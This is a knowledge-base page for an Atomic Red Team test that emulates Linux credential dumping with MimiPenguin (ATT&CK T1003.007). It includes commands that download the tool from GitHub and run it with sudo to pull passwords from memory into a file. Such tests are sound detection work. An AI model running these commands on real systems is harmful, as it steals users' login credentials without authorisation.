---
atomic_guid: "a27418de-bdce-4ebd-b655-38f04842bf0c"
title: "Capture Passwords with MimiPenguin"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.007"
attack_technique_name: "OS Credential Dumping: Proc Filesystem"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.007/T1003.007.yaml"
build_date: "2026-04-26 17:02:12"
executor: "bash"
aliases:
  - "a27418de-bdce-4ebd-b655-38f04842bf0c"
  - "Capture Passwords with MimiPenguin"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Capture Passwords with MimiPenguin

MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). 
Upon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. 
See https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. 
See https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.

## Metadata

- Atomic GUID: a27418de-bdce-4ebd-b655-38f04842bf0c
- Technique: T1003.007: OS Credential Dumping: Proc Filesystem
- Platforms: linux
- Executor: bash
- Elevation Required: True
- Dependency Executor: sh
- Source Path: atomics/T1003.007/T1003.007.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.007]]

## Input Arguments

### MimiPenguin_Location

- description: Path of MimiPenguin script
- type: path
- default: /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh

### output_file

- description: Path where captured results will be placed
- type: path
- default: /tmp/T1003.007Test3.txt

## Dependencies

MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})

### Prerequisite Check

```bash
if [ -f "#{MimiPenguin_Location}" ]; then exit 0; else exit 1; fi;
```

### Get Prerequisite

```bash
wget -O "/tmp/mimipenguin.tar.gz" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz
mkdir /tmp/mimipenguin
tar -xzvf "/tmp/mimipenguin.tar.gz" -C /tmp/mimipenguin
```

Strings must be installed

### Prerequisite Check

```bash
if [ -x "$(command -v strings --version)" ]; then exit 0; else exit 1; fi;
```

### Get Prerequisite

```bash
sudo apt-get -y install binutils
```

Python2 must be installed

### Prerequisite Check

```bash
if [ -x "$(command -v python2 --version)" ]; then exit 0; else exit 1; fi;
```

### Get Prerequisite

```bash
sudo apt-get -y install python2
```

Libc-bin must be installed

### Prerequisite Check

```bash
if [ -x "$(command -v ldd --version)" ]; then exit 0; else exit 1; fi;
```

### Get Prerequisite

```bash
sudo apt-get -y install libc-bin
```

## Executor

- elevation_required: True
- name: bash

### Command

```bash
sudo #{MimiPenguin_Location} > #{output_file}
cat #{output_file}
```

### Cleanup

```bash
rm -f #{output_file} > /dev/null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.007/T1003.007.yaml)
